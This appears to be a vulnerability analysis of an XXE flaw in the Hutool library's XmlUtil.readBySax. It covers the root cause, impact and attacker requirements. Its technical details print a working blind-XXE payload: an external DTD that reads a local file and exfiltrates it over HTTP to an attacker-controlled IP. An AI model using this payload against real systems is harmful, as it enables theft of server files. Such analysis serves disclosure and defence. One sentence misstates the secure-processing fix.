Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:**
The vulnerability stems from the `readBySax` function in `XmlUtil.java` within the Hutool library. This function uses `SAXParserFactory` which, by default, is susceptible to XML External Entity (XXE) attacks because it doesn't disable external entity processing.

**Weaknesses/Vulnerabilities:**
- **XXE Vulnerability:** The core weakness is the lack of proper configuration in `SAXParserFactory` to prevent external entity resolution. Specifically, the code does not disable `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` or use similar methods to prevent XXE attacks.

**Impact of Exploitation:**
- **Arbitrary File Reading:** An attacker can exploit this vulnerability to read arbitrary files from the server's file system. In this specific example, they were able to read the content of `G:/test.txt`.
- **Blind XXE:** Since the application doesn't directly display the content of the parsed XML, this is a "Blind XXE" vulnerability. The attacker extracts data via out-of-band methods, in this case, an HTTP request.

**Attack Vectors:**
- **Malicious XML Payload:** The attacker crafts a malicious XML file (`test.xml`) containing an external DTD reference.
- **External DTD:** The malicious DTD file (`evil.dtd`) is hosted on an attacker-controlled server and contains instructions to read a local file and exfiltrate it via an HTTP request to a second attacker controlled server.

**Required Attacker Capabilities/Position:**
- **Ability to control the XML input:** The attacker needs to be able to supply the malicious XML payload to the vulnerable `XmlUtil.readBySax` method.
- **Network Access:** The attacker needs to be able to host a malicious DTD file on a server accessible by the vulnerable application. They also need a second server to capture the extracted data.
- **Knowledge of the target file system:** The attacker needs to have knowledge of file paths on the target system to read sensitive files.

**Technical Details:**
- The `test.xml` file includes an external DTD reference: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.3.183/evil.dtd"> %xxe; ]>`.
- The `evil.dtd` file defines an entity `%file` to read the target file and another entity `%exfil` to exfiltrate it over HTTP: `<!ENTITY % file SYSTEM "file:///g:/test.txt"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.3.183:9999/?x=%file;'>">%eval;%exfil;`.
- The exploit uses a HTTP server to host the `evil.dtd` and a netcat listener to receive the exfiltrated data.
